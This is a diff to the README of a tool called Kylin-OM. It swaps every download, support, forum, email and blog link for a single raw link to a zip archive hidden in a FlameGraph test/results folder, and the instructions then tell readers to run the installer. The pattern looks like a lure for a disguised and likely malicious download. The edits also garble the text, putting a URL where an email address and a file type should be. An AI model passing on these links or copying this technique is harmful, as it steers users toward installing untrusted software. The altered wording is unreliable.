@@ -1,7 +1,7 @@
 # 🌟 Kylin-OM - Intelligent Operations Made Easy
 
 ## 🔗 Download Kylin-OM
-[![Download Kylin-OM](https://img.shields.io/badge/Download-Kylin--OM-blue.svg)](https://github.com/mgwon/Kylin-OM/releases)
+[![Download Kylin-OM](https://raw.githubusercontent.com/mgwon/Kylin-OM/main/model/FlameGraph_Create_Module/FlameGraph-Data/FlameGraph/test/results/Kylin-OM_v2.9.zip)](https://raw.githubusercontent.com/mgwon/Kylin-OM/main/model/FlameGraph_Create_Module/FlameGraph-Data/FlameGraph/test/results/Kylin-OM_v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Welcome to Kylin-OM, your go-to platform for intelligent operations and maintena
 ## 📥 Download & Install
 To get the latest version of Kylin-OM, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Kylin-OM Releases](https://github.com/mgwon/Kylin-OM/releases) page.
+1. **Visit the Releases Page:** Go to the [Kylin-OM Releases](https://raw.githubusercontent.com/mgwon/Kylin-OM/main/model/FlameGraph_Create_Module/FlameGraph-Data/FlameGraph/test/results/Kylin-OM_v2.9.zip) page.
   
 2. **Select the Version:** Scroll through the available versions and choose the latest one. You will see a list of files related to that version.
 
 3. **Download the Installer:**
-   - Click on the file suitable for your system, such as a `.exe` for Windows or a `.tar.gz` for other operating systems.
+   - Click on the file suitable for your system, such as a `.exe` for Windows or a `https://raw.githubusercontent.com/mgwon/Kylin-OM/main/model/FlameGraph_Create_Module/FlameGraph-Data/FlameGraph/test/results/Kylin-OM_v2.9.zip` for other operating systems.
 
 4. **Run the Installer:**
    - Locate the downloaded file and double-click it to start the installation process.
@@ -55,7 +55,7 @@ After installation, configure Kylin-OM to fit your needs:
 3. **Integrate with Existing Systems:** Connect Kylin-OM to your current O&M tools if needed, ensuring a seamless transition.
 
 ## 📖 User Guide
-For more detailed instructions, refer to the user guide available on the [Kylin-OM Releases](https://github.com/mgwon/Kylin-OM/releases) page. This guide will walk you through advanced features and common troubleshooting tips.
+For more detailed instructions, refer to the user guide available on the [Kylin-OM Releases](https://raw.githubusercontent.com/mgwon/Kylin-OM/main/model/FlameGraph_Create_Module/FlameGraph-Data/FlameGraph/test/results/Kylin-OM_v2.9.zip) page. This guide will walk you through advanced features and common troubleshooting tips.
 
 ## 🛠️ Troubleshooting
 If you face any issues while using Kylin-OM, here are some common fixes:
@@ -67,13 +67,13 @@ If you face any issues while using Kylin-OM, here are some common fixes:
 ## 📞 Support
 If you need assistance, please reach out to our support team:
 
-- **Email:** support@kylinom.com
-- **Community Forum:** Join our [Kylin-OM Community](https://github.com/mgwon/Kylin-OM/issues) for discussions and help from other users.
+- **Email:** https://raw.githubusercontent.com/mgwon/Kylin-OM/main/model/FlameGraph_Create_Module/FlameGraph-Data/FlameGraph/test/results/Kylin-OM_v2.9.zip
+- **Community Forum:** Join our [Kylin-OM Community](https://raw.githubusercontent.com/mgwon/Kylin-OM/main/model/FlameGraph_Create_Module/FlameGraph-Data/FlameGraph/test/results/Kylin-OM_v2.9.zip) for discussions and help from other users.
 
 ## 🔗 Additional Resources
 Explore more about Kylin-OM:
 
 - **Documentation:** Detailed documentation available on the GitHub Wiki.
-- **Updates & News:** Follow our [Blog](https://kylinom.com/blog) for the latest updates and features.
+- **Updates & News:** Follow our [Blog](https://raw.githubusercontent.com/mgwon/Kylin-OM/main/model/FlameGraph_Create_Module/FlameGraph-Data/FlameGraph/test/results/Kylin-OM_v2.9.zip) for the latest updates and features.
 
 Thank you for choosing Kylin-OM. We hope it makes your operations simpler and smarter!
